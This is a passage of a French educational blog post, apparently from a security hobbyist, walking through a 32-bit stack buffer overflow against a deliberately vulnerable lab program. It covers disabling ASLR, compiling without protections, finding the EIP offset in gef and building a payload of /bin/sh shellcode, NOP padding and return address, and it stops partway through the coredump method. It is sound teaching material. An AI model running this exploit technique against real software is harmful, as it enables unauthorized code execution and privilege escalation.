@@ -1,0 +1,1648 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "blog-fr",
+        "name" : "🇫🇷  BufferOverflow 32bits sans protection",
+        "headline" : "🇫🇷  BufferOverflow 32bits sans protection",
+        "description" : "Initiation aux BufferOverflow sous linux.",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-09-12 00:00:00 \x2b0000 UTC",
+        "dateModified" : "2020-09-12 00:00:00 \x2b0000 UTC",
+        "url" : "\/blog-fr\/binary\/4-bufferoverflow\/",
+        "wordCount" : "1253",
+        "keywords" : [ "Blog" ]
+    }
+    </script>
+        
+            
+                <title>🇫🇷  BufferOverflow 32bits sans protection</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.68.3" />
+        
+
+
+        
+            <meta name="author" content="AlrikRr">
+        
+        
+            <meta name="description" content="Initiation aux BufferOverflow sous linux.">
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="🇫🇷  BufferOverflow 32bits sans protection"/>
+<meta name="twitter:description" content="Initiation aux BufferOverflow sous linux."/>
+<meta name="twitter:site" content="@AlrikRr"/>
+
+        <meta property="og:title" content="🇫🇷  BufferOverflow 32bits sans protection" />
+<meta property="og:description" content="Initiation aux BufferOverflow sous linux." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog-fr/binary/4-bufferoverflow/" />
+<meta property="article:published_time" content="2020-09-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-09-12T00:00:00+00:00" />
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        <meta itemprop="name" content="🇫🇷  BufferOverflow 32bits sans protection">
+<meta itemprop="description" content="Initiation aux BufferOverflow sous linux.">
+<meta itemprop="datePublished" content="2020-09-12T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-09-12T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1253">
+
+
+
+<meta itemprop="keywords" content="" />
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+	    <link disabled id="dark-mode-theme" rel="stylesheet" href="/css/dark.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    
+      <h1><a href="/">blog-fr</a></h1>
+    
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/blog-fr/">
+                            <i class="">&nbsp;</i>🇫🇷 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/blog-en/">
+                            <i class="">&nbsp;</i>🇬🇧 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/projects/">
+                            <i class="fa fa-list">&nbsp;</i>Projects
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories/">
+                            <i class="fa fa-folder">&nbsp;</i>Categories
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about/">
+                            <i class="">&nbsp;</i>👺 My resume
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://www.levulgarisateurnumerique.com/">
+                            <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://secforall.org/">
+                            <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            
+            <li id="share-nav" class="share-menu" style="display:none;">
+                <a class="fa-share-alt" href="#share-menu">Share</a>
+            </li>
+            
+            <li>
+	 <a id="dark-mode-toggle" class="fal fa-moon-o">Dark Mode</a>
+            </li>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+
+	<script>
+var toggle = document.getElementById("dark-mode-toggle");
+var darkTheme = document.getElementById("dark-mode-theme");
+var savedTheme = localStorage.getItem("dark-mode-storage") || "light";
+setTheme(savedTheme);
+
+toggle.addEventListener("click", () => {
+    if (toggle.className === "fal fa-moon-o") {
+        setTheme("dark");
+    } else if (toggle.className === "fal fa-sun-o") {
+        setTheme("light");
+    }
+});
+
+function setTheme(mode) {
+	    localStorage.setItem("dark-mode-storage", mode);
+    if (mode === "dark") {
+        darkTheme.disabled = false;
+        toggle.className = "fal fa-sun-o";
+    } else if (mode === "light") {
+        darkTheme.disabled = true;
+        toggle.className = "fal fa-moon-o";
+    }
+}
+	</script>
+
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <form class="search" method="get" action="//google.com/search">
+                <input type="text" name="q" placeholder="Search" />
+                <input type="hidden" name="as_sitesearch" value="/">
+            </form>
+        </section>
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/blog-fr/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇫🇷 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/blog-en/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇬🇧 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/projects/">
+                            <h3>
+                                <i class="fa fa-list">&nbsp;</i>Projects
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories/">
+                            <h3>
+                                <i class="fa fa-folder">&nbsp;</i>Categories
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/about/">
+                            <h3>
+                                <i class="">&nbsp;</i>👺 My resume
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://www.levulgarisateurnumerique.com/">
+                            <h3>
+                                <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://secforall.org/">
+                            <h3>
+                                <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-18'>
+                                    November 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-11'>
+                                    November 11, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-18'>
+                                    September 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-15'>
+                                    September 15, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-14'>
+                                    September 14, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-12'>
+                                    September 12, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /blog/
+                        
+                        class="button">View more posts</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;text=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="title">
+        
+            <h1><a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a></h1>
+            
+        
+        
+            <p>Initiation aux BufferOverflow sous linux.</p>
+        
+    </div>
+    <div class="meta">
+        
+
+        <time class="published"
+            datetime='2020-09-12'>
+            September 12, 2020</time>
+        <span class="author">AlrikRr</span>
+        
+            <p>6 minute read</p>
+        
+        
+    </div>
+</header>
+
+
+  
+    <section id="social-share">
+      <ul class="icons">
+        
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;text=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fbinary%2f4-bufferoverflow%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20%20BufferOverflow%2032bits%20sans%20protection" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </section>
+  
+
+  
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+  <div id="content">
+    <h1 id="quest-ce-quun-bufferoverflow-">Qu&rsquo;est ce qu&rsquo;un BufferOverflow ?</h1>
+<p>Un BufferOverflow consiste à écraser la pile EIP d&rsquo;un programme à un moment donné afin de compromettre une application.</p>
+<p>L'écrasement de la pile peut se faire par différents moyens, mais le principal problème vient d&rsquo;une mauvaise gestion d&rsquo;un buffer pendant la saisie par un utilisateur.</p>
+<h2 id="pourquoi-">Pourquoi ?</h2>
+<ul>
+<li>Faire crash une application (un DOS)</li>
+<li>Avoir un shell avec des droits prévilégiés</li>
+<li>Voler des informations ( Leak Memory )</li>
+<li>Avoir un reverse shell ou un bind shell à distance</li>
+</ul>
+<h1 id="pré-requis">Pré-Requis</h1>
+<p>Avant de commencer l&rsquo;exploitation de notre binaire, il faut désactiver la protection ASLR activée par défaut sous linux.</p>
+<p>Pour la désactiver entrez la commande suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo sysctl kernel.randomize_va_space<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</code></pre></div><p>Je vous conseil d&rsquo;avoir une bonne connaissance sur la gestion de la mémoire, sur l&rsquo;assembleur et sur l&rsquo;utilisation de GDB avant de continuer.</p>
+<h1 id="buffer_32">buffer_32</h1>
+<h2 id="code">Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argument){
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
+    strcpy(buffer, argument);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+    vulnerable(argv[<span style="color:#ae81ff">1</span>]);
+    printf(<span style="color:#e6db74">&#34;Fin du Programme!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h2 id="compilation">Compilation</h2>
+<p>Si vous êtes en 64Bits, il vous faut installer les librairies 32Bits :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo apt install gcc-multilib 
+</code></pre></div><p>Sur Archlinux :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » sudo pacman -S lib32-glibc lib32-gcc-libs
+</code></pre></div><p>Pour compiler le programme, utilisez <code>gcc</code> avec les paramètres suivant :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » gcc -m32 -fno-stack-protector -z execstack -o buffer_32 buffer_32.c -no-pie
+</code></pre></div><h2 id="explication">Explication</h2>
+<p>Le binaire est assez simple, il prend une chaîne de caractère.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> main(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</code></pre></div><p>Cette chaîne est ensuite envoyée comme argument à la fonction <code>vulnerable()</code> afin d'être copié dans un buffer d&rsquo;une taille de 100 avec <code>strcpy()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">[...]
+vulnerable(argv[<span style="color:#ae81ff">1</span>]);
+[...]
+strcpy(buffer, argv[<span style="color:#ae81ff">1</span>]);
+</code></pre></div><p>Si l&rsquo;utilisateur met une chaîne d&rsquo;une taille inférieur à 100, le programme s&rsquo;execute normalement.</p>
+<p>En revanche, si la chaîne fait plus d&rsquo;une centaine de caratères, plus grand que le buffer donc, ça plante ! Car la taille alloué au buffer ne sera pas suffisante !</p>
+<p><img src="/img/binary/4-execution-buffer.png" alt="4-execution-buffer.png"></p>
+<p>Dans la capture d'écran, on peut voir une première utilisation dite &ldquo;normale&rdquo; du programme.</p>
+<p>La deuxième commande va injecter avec l&rsquo;aide de python 101 caractère <strong>&ldquo;A&rdquo;</strong>, ce qui va faire planter le programme. (segmentation fault)</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="première-exécution">Première exécution</h3>
+<p>Très bien, maintenant que l&rsquo;on a vu notre programme planté, on va commencer à l&rsquo;exploiter.</p>
+<p>Nous allons ouvrir notre programme avec l&rsquo;outil <code>gdb</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » gdb buffer_32
+</code></pre></div><p>J&rsquo;utilise le plugin <a href="https://github.com/hugsy/gef">gef</a> pour avoir une meilleure expérience de jeu ;)</p>
+<p>On va executer une première fois notre programme avec la commande <code>run</code>
+<img src="/img/binary/4-gef-run.png" alt="4-gef-run.png"></p>
+<p>Pour le moment ce qui nous intéresse, c&rsquo;est le résultat du &ldquo;ltrace&rdquo; en vert, on peut voir des fonctions intéressantes comme :</p>
+<ul>
+<li><strong>main()</strong></li>
+<li><strong>vulnerable()</strong></li>
+</ul>
+<p>On peut continuer notre analyse avec la commande <code>disas</code> qui va nous permetre d&rsquo;afficher le code assembleur d&rsquo;une fonction, on commence avec le main.</p>
+<p><img src="/img/binary/4-disas-main.png" alt="4-disas-main.png"></p>
+<p>En rouge on peut voir où est appellé la fonction <code>vulnerable()</code>.</p>
+<p>Même manipulation qu&rsquo;avec le main.</p>
+<p><img src="/img/binary/4-disas-vulnerable.png" alt="4-disas-vulnerable.png"></p>
+<p>En rouge cette fois on peut voir notre fonction <code>strcpy()</code> vulnérable au buffer.</p>
+<h3 id="overflow-de-a">Overflow de &ldquo;A&rdquo;</h3>
+<p>Bien maintenant, passons au buffer, nous allons refaire le même crash du début mais cette fois avec <code>gef</code> pour voir ce qu&rsquo;il se passe.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤ run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div><p><img src="/img/binary/4-buffer-A.png" alt="4-buffer-A.png"></p>
+<p>Maintenant, on vois bien pourquoi le programme plante.<br>
+EIP qui est sensé contenir l&rsquo;adresse de l&rsquo;instruction suivante se retrouve rempli avec <code>AAAA</code> ce qui donne en hexadecimal <code>0x41414141</code>.</p>
+<h3 id="calcule-du-padding">Calcule du padding</h3>
+<p>Maintenant que l&rsquo;on peut voir le contenu de EIP, nous allons trouver le padding, c&rsquo;est à dire le nombre de caractères qu&rsquo;il faut pour arriver jusqu'à EIP.<br>
+L&rsquo;objectif final est de pouvoir manipuler la valeur de EIP avec par exemple <code>ABCD</code>.</p>
+<p>Pour ce faire, nous allons créer un pattern :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern create <span style="color:#ae81ff">116</span>
+</code></pre></div><p>Lancer le programme avec le pattern :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab
+</code></pre></div><p>Faire une recherche du pattern en récupérant l&rsquo;adresse de EIP :
+<img src="/img/binary/4-EIP-pattern.png" alt="4-EIP-pattern.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern search 0x62616164
+</code></pre></div><p><img src="/img/binary/4-EIP-pattern-offset.png" alt="4-EIP-pattern-offset.png"></p>
+<p>Nous avons bien une taille de <strong>112</strong> avant d'écraser <strong>EIP</strong>.</p>
+<p>Maintenant, nous allons créer un pattern de 112 <strong>&ldquo;A&rdquo;</strong> et y ajouter <strong>&ldquo;ABCD&rdquo;</strong> à la fin, si tout va bien, on devrait voir apparaître &ldquo;ABCD&rdquo; dans <strong>EIP</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
+</code></pre></div><p><img src="/img/binary/4-EIP-ABCD.png" alt="4-EIP-ABCD.png"></p>
+<p>Bingo !</p>
+<h2 id="le-payload">Le payload</h2>
+<p>Pour la création de notre payload, il nous faut :</p>
+<ul>
+<li>La distance vers EIP</li>
+<li>Un shellcode</li>
+<li>L&rsquo;adresse à laquelle commence le shellcode (SIP)</li>
+</ul>
+<p>Notre payload devrais ressembler à ça :</p>
+<table>
+<thead>
+<tr>
+<th>SHELLCODE (n)</th>
+<th>PADDING (112 - n)</th>
+<th>SIP</th>
+</tr>
+</thead>
+</table>
+<p>Le padding devra prendre en compte la taille du shellcode car celui-ci sera techniquement dans le padding.</p>
+<h3 id="le-shellcode">Le shellcode</h3>
+<p>Pour le shellcode, je vais en utiliser un tout fait disponible à cette adresse : <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shell-storm.org/shellcode</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</code></pre></div><p>C&rsquo;est un shellcode x86 de 23 bytes qui va executer <code>/bin/sh</code>.</p>
+<p>Notre shellcode fait donc 23 bytes, ce qui va nous faire un padding de 89.</p>
+<table>
+<thead>
+<tr>
+<th>SHELLCODE (23)</th>
+<th>PADDING (89)</th>
+<th>SIP</th>
+</tr>
+</thead>
+</table>
+<h3 id="le-padding">Le padding</h3>
+<p>Pour le padding, c&rsquo;est assez simple, nous allons mettre des instructions <code>\x90</code> , NOP, à la place de nos &ldquo;A&rdquo; pour éviter une mauvaise interprétation des &ldquo;A&rdquo; par notre programme.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">89</span>
+</code></pre></div><h3 id="le-sip">Le SIP</h3>
+<p>Le SIP est donc l&rsquo;adresse du début de notre shellcode, cette adresse va être ajouté dans EIP ce qui va faire pointer EIP sur notre shellcode.</p>
+<p>Pour trouver le SIP, je vais vous monter 2 méthodes.</p>
+<ul>
+<li>
+<p>La première avec GDB qui va nous afficher l&rsquo;adresse du premier argument de la fonction <code>strcpy</code></p>
+</li>
+<li>
+<p>La deuxième sera un peu plus longue mais tout aussi intéressante, en utilisant le dump d&rsquo;un crash et en parcourant la stack avec gdb.</p>
+</li>
+</ul>
+<h3 id="création-du-payload">Création du payload</h3>
+<p>Avec python je vais enregistrer mon payload dans un fichier <code>payload.bin</code></p>
+<p>Voici mon script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">89</span>
+
+SIP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x41\x41\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># SIP = &#34;AAAA&#34;</span>
+
+payload <span style="color:#f92672">=</span> shellcode <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> SIP
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(payload)
+
+
+</code></pre></div><p>Pour le moment on va mettre  &ldquo;AAAA&rdquo; dans SIP car on ne le connait pas encore.</p>
+<p>Pour executer le payload, je vous conseil d&rsquo;utiliser python2.</p>
+<h4 id="méthode--gdb">Méthode : GDB</h4>
+<p>Pour commencer, on va placer un breakpoint sur la fonction <code>strcpy()</code> qui se trouve dans <code>vulnerable()</code>.</p>
+<p><img src="/img/binary/4-strcpy.png" alt="4-strcpy.png"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤ b * 0x080491a3
+</code></pre></div><p>Ensuite on execute notre payload comme ceci :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  r <span style="color:#66d9ef">$(</span>cat payload.bin<span style="color:#66d9ef">)</span>
+</code></pre></div><p><img src="/img/binary/4-strcpy-sip-gdb.png" alt="4-strcpy-sip-gdb.png"></p>
+<p>Arrivé sur le breakpoint , on peut voir dans la section <em>arguments guessed</em> notre fonction <code>strcpy()</code> qui prend deux arguments, dans le carré vert.</p>
+<p>Ici seulement la première adresse en rouge nous intéresse.</p>
+<p>Nous voici donc notre SIP : <code>0xffffd17c</code></p>
+<p>Pensez à le mettre en Little-Indian dans votre code python :
+<code>\x7c\xd1\xff\xff</code></p>
+<h4 id="méthode--coredump">Méthode : COREDUMP</h4>
+<p>Pour la méthode coredump, vous allez avoir besoin de l&rsquo;outil <code>coredumpctl</code>.</p>
+<p>On va faire crasher notre application avec notre payload python. (Celui qui contient les &ldquo;AAAA&rdquo; en SIP)</p>
